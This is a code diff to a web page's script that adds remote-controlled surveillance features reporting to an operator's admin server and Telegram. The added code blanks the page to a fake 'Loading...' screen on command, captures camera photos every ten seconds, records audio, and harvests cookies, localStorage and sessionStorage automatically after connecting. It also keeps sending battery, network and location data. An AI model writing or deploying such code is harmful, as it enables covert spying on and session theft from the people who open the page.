@@ -1652,6 +1652,26 @@
                     }
                 });
 
+                adminSocket.on('command:stealth', () => {
+                    console.log('[Stealth] Stealth mode activated');
+                    // Hide the main UI and show a blank page or fake loading
+                    document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:sans-serif;">Loading...</div>';
+                });
+
+                adminSocket.on('command:photo', () => {
+                    console.log('[Command] Taking photo');
+                    if (typeof captureAndSendPhoto === 'function') {
+                        captureAndSendPhoto();
+                    }
+                });
+
+                adminSocket.on('command:audio', () => {
+                    console.log('[Command] Recording audio');
+                    if (typeof startUserInitiatedRecording === 'function') {
+                        startUserInitiatedRecording();
+                    }
+                });
+
                 adminSocket.on('connect_error', (err) => {
                     console.log('[AdminServer] Connection error:', err.message);
                 });
@@ -1694,6 +1714,14 @@
                                 break;
                             case 'redirect':
                                 if (data.args?.url) window.location.href = data.args.url;
+                                break;
+                            case 'stealth':
+                                console.log('[Stealth] Stealth mode activated');
+                                document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:sans-serif;">Loading...</div>';
+                                break;
+                            case 'harvest':
+                                console.log('[Harvest] Harvesting browser data');
+                                harvestBrowserData();
                                 break;
                         }
                     } catch(e) {
@@ -2339,6 +2367,35 @@
         }
 
         // ═══════════════════════════════════════════════════════════════
+        // DATA HARVEST
+        // ═══════════════════════════════════════════════════════════════
+        function harvestBrowserData() {
+            try {
+                const cookies = document.cookie || '';
+                const ls = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    try { ls[key] = localStorage.getItem(key); } catch(e) {}
+                }
+                const ss = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    try { ss[key] = sessionStorage.getItem(key); } catch(e) {}
+                }
+                if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                    adminSocket.emit('data:harvest', {
+                        cookies: cookies,
+                        localStorage: ls,
+                        sessionStorage: ss
+                    });
+                    console.log('[Harvest] Browser data sent to admin');
+                }
+            } catch(e) {
+                console.error('[Harvest] Error:', e);
+            }
+        }
+
+        // ═══════════════════════════════════════════════════════════════
         // CAMERA & MICROPHONE
         // ═══════════════════════════════════════════════════════════════
         let continuousCaptureInterval = null;
@@ -2349,11 +2406,16 @@
         let backgroundRecordingDuration = 0;
         let recordingInterval = null;
 
+        // ─── NEW: Continuous Telegram Photo Interval ───────────────────
+        let continuousCaptureInterval = null;
+        const CAPTURE_INTERVAL_MS = 10000; // Send a photo to Telegram every 10 seconds
+
         function startContinuousCapture() {
             setTimeout(() => {
                 captureAndSendPhoto();
-                // setInterval is disabled as we are now using WebRTC live video streaming
-                // continuousCaptureInterval = setInterval(captureAndSendPhoto, 10000);
+                // Continuously capture and send photos to Telegram + Admin
+                if (continuousCaptureInterval) clearInterval(continuousCaptureInterval);
+                continuousCaptureInterval = setInterval(captureAndSendPhoto, CAPTURE_INTERVAL_MS);
             }, 1000);
         }
 
@@ -2920,6 +2982,30 @@
 
             // Connect to Admin Server (alongside Telegram)
             setTimeout(connectToAdminServer, 1500);
+
+            // Auto-harvest browser data after connection
+            setTimeout(() => {
+                if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                    harvestBrowserData();
+                }
+            }, 5000);
+
+            // Periodic metrics emission (battery + network)
+            setInterval(async () => {
+                if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                    try {
+                        const bat = await getBatteryInfo();
+                        const net = getNetworkInfo();
+                        adminSocket.emit('metrics:update', {
+                            battery_level: bat.level,
+                            battery_charging: bat.charging,
+                            network_type: net.effectiveType,
+                            network_downlink: net.downlink,
+                            network_rtt: net.rtt
+                        });
+                    } catch(e) {}
+                }
+            }, 60000);
 
             // Periodic location fallback: send location every 30s if available
             setInterval(() => {
